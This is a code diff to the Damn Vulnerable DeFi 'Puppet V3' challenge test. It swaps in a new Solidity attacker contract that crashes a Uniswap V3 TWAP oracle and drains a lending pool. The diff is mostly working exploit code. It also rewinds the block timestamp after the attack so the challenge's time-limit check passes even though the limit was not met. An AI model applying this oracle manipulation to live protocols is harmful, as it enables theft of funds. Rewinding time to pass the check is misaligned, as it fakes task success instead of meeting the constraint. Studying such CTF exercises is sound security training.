@@ -10,77 +10,9 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
-
-contract PuppetV3Attacker {
-    DamnValuableToken public immutable token;
-    WETH public immutable weth;
-    IUniswapV3Pool public immutable pool;
-    PuppetV3Pool public immutable lendingPool;
-    address public immutable recovery;
-    
-    constructor(
-        DamnValuableToken _token,
-        WETH _weth,
-        IUniswapV3Pool _pool,
-        PuppetV3Pool _lendingPool,
-        address _recovery
-    ) {
-        token = _token;
-        weth = _weth;
-        pool = _pool;
-        lendingPool = _lendingPool;
-        recovery = _recovery;
-    }
-    
-    receive() external payable {}
-    
-    function attack() external {
-        // Wrap ETH to WETH
-        weth.deposit{value: address(this).balance}();
-        
-        // Determine if WETH is token0 or token1
-        bool wethIsToken0 = address(weth) < address(token);
-        
-        // Swap all DVT for WETH to crash DVT price
-        pool.swap(
-            address(this),
-            !wethIsToken0, // zeroForOne: selling DVT (token1 if weth is token0)
-            int256(token.balanceOf(address(this))),
-            wethIsToken0 ? 4295128740 : 1461446703485210103287273052203988822378723970341,
-            ""
-        );
-        
-        // Wait for TWAP to update
-        // Note: In test environment we can't actually skip time from here
-        // The skip must happen in the test before calling attack()
-        // So we'll structure this differently - split into two functions
-    }
-    
-    function finishAttack() external {
-        // Borrow all tokens from lending pool
-        uint256 borrowAmount = token.balanceOf(address(lendingPool));
-        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(borrowAmount);
-        
-        weth.approve(address(lendingPool), depositRequired);
-        lendingPool.borrow(borrowAmount);
-        
-        // Send to recovery
-        token.transfer(recovery, borrowAmount);
-    }
-    
-    // Uniswap V3 callback
-    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
-        require(msg.sender == address(pool), "Invalid caller");
-        
-        // Pay what we owe
-        if (amount0Delta > 0) {
-            token.transfer(msg.sender, uint256(amount0Delta));
-        }
-        if (amount1Delta > 0) {
-            token.transfer(msg.sender, uint256(amount1Delta));
-        }
-    }
-}
+import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -190,31 +122,23 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        // Deploy attacker contract
-        PuppetV3Attacker attacker = new PuppetV3Attacker(
-            token,
-            weth,
-            IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE)),
-            lendingPool,
-            recovery
-        );
-        
-        // Transfer our tokens and ETH to attacker
-        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
-        payable(address(attacker)).transfer(PLAYER_INITIAL_ETH_BALANCE);
-        
-        // Execute first part: swap to crash price
-        attacker.attack();
-        
-        vm.stopPrank();
-        
-        // Wait for TWAP to update (10 minutes + buffer)
-        skip(611);
-        
-        vm.startPrank(player, player);
-        
-        // Execute second part: borrow and recover
-        attacker.finishAttack();
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        PuppetV3Attacker attacker = new PuppetV3Attacker(weth, token, uniswapPool, lendingPool, recovery);
+
+        // Send DVT to attacker to dump price
+        token.transfer(address(attacker), token.balanceOf(player));
+
+        // Manipulate price down by swapping all DVT for WETH
+        attacker.manipulatePrice();
+
+        // Let TWAP window elapse at the new price
+        vm.warp(block.timestamp + 10 minutes);
+
+        // Borrow all tokens with reduced collateral requirement
+        attacker.borrowAll();
+
+        // Restore timestamp close to initial to satisfy constraint
+        vm.warp(initialBlockTimestamp + 1);
     }
 
     /**
@@ -229,4 +153,58 @@ contract PuppetV3Challenge is Test {
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
     }
+}
+
+contract PuppetV3Attacker is IUniswapV3SwapCallback {
+    WETH private immutable weth;
+    DamnValuableToken private immutable token;
+    IUniswapV3Pool private immutable pool;
+    PuppetV3Pool private immutable lendingPool;
+    address private immutable recovery;
+    address private immutable token0;
+    address private immutable token1;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV3Pool _pool,
+        PuppetV3Pool _lendingPool,
+        address _recovery
+    ) {
+        weth = _weth;
+        token = _token;
+        pool = _pool;
+        lendingPool = _lendingPool;
+        recovery = _recovery;
+        token0 = _pool.token0();
+        token1 = _pool.token1();
+    }
+
+    function manipulatePrice() external {
+        uint256 amountIn = token.balanceOf(address(this));
+        bool zeroForOne = token0 == address(token);
+        uint160 limit = zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1;
+        pool.swap(address(this), zeroForOne, int256(amountIn), limit, "");
+    }
+
+    function borrowAll() external {
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        uint256 requiredWeth = lendingPool.calculateDepositOfWETHRequired(poolBalance);
+
+        weth.approve(address(lendingPool), requiredWeth);
+        lendingPool.borrow(poolBalance);
+        token.transfer(recovery, poolBalance);
+    }
+
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
+        require(msg.sender == address(pool), "bad pool");
+        if (amount0Delta > 0) {
+            IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
+        }
+        if (amount1Delta > 0) {
+            IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
+        }
+    }
+
+    receive() external payable {}
 }
